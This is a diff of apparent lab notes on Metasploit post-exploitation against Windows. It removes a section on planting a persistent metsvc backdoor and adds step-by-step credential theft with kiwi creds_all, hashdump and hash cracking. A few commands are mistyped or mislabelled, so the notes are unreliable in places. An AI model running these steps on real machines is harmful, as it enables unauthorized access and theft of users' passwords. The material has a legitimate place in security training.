@@ -122,76 +122,65 @@ Back dooring:
   We do this through a persistent backdoor; even when an exploit is patched
   having a backdoor in place will allow you to get back in without credentials.
 
-  We first set the exploit:
+Password Retrieval (Post Exploit):
 
-    msf > use exploit/multi/handler
+  The windows System Account Manager (SAM) is a database file
+  used by windows operating systems to store user passwords.
 
-  Then the payload:
+  It hashes these passwords using a hashing formats called 'LM' and 'NTLM'.
 
-    msf > set PAYLOAD windows/metsvc_bind_tcp
+  Both have their own distinctions; we can use programs to perform password
+  retrieval to attain passwords and decode these hashes in the database.
 
-  Set a random port:
+  Kiwi:
 
-    msf > set LHOST <random port>
+    This decodes windows hashes within a meterpreter session.
 
-  Then run the exploit.
+    Within a meterpreter session, write the following command:
 
-    msf exploit(handler) > exploit
+      meterpreter > load kiwi
 
-  In a meterpreter session we can do the following.
+    This will load the kiwi extension for usage in the meterpreter session.
 
-    meterpreter > run metsvc -h
+      meterpreter > help kiwi
 
-  This gets the options of metsvc meterpreter script.
+    This will display the commands available to kiki.
 
-  The -A flag automatically starts the backdoor.
+    The, the fun part; write the command 'creds_all.'
 
-    meterpreter > run metsvc -A
+      meterpreter > creds_all
 
-  This creates a backdoor that reads a random port and adds the backdoor along
-  with a dynamically linked library at a random directory.
+    This will get all the credentials and decode them; note that a user
+    needs to have logged in before this command produces meaningful output.
 
-  You can display these files by the following.
+  Hashdump:
 
-    meterpreter > ls
+    This dumps the hashes on the windows machine.
 
-  We can create a remote shell session of the target using the shell command.
+      meterpreter > hashdump
 
-    meterpreter > shell
+    You can then copy the output of this command and paste it to
+    a file for a subsequent decoding; john the ripper for example
+    could be used.
 
-  We can then type net-start, to determine the active running net daemons.
+    From the meterpreter session, move the current session to the background
+    via the following.
 
-    ~$ net-start
+      meterpreter > bg
 
-  We can list the metsvc process by writing the following.
+    It'll tell you the number of the session, to use when you want to go back.
 
-    ~$ sc query metsvc
+    Load the hashdump module by writing the following in the metasploit session.
 
-  Services will attempt to restart themselves if they fail the first time; task manager can be used to
-  see the active processes.
+      msf > use post/windows/gather/hashdump
 
-  Perform the eternalBlue exploit; push the session into the background.
+    Then go back to the session prior; in my case it was session one.
 
-    meterpreter > bg
+      msf > set session 1
 
-  You can get the shell session ID by using the following.
+    Then, perform the exploit.
 
-    msf exploit > sessions
+      msf > exploit
 
-  Then, load the payload:
+    Common passwords will be found easily; Pa$$w0rd01 was found for me on the virtual machine.
 
-    msf exploit > use exploit /window/local/persistence_service
-
-  List the options.
-
-    msf exploit > options
-
-  Set the options accordingly.
-
-  Then go back to the previous meterpreter session:
-
-    msf > set session <session ID>
-
-  Perform the exploit:
-
-    msf > exploit
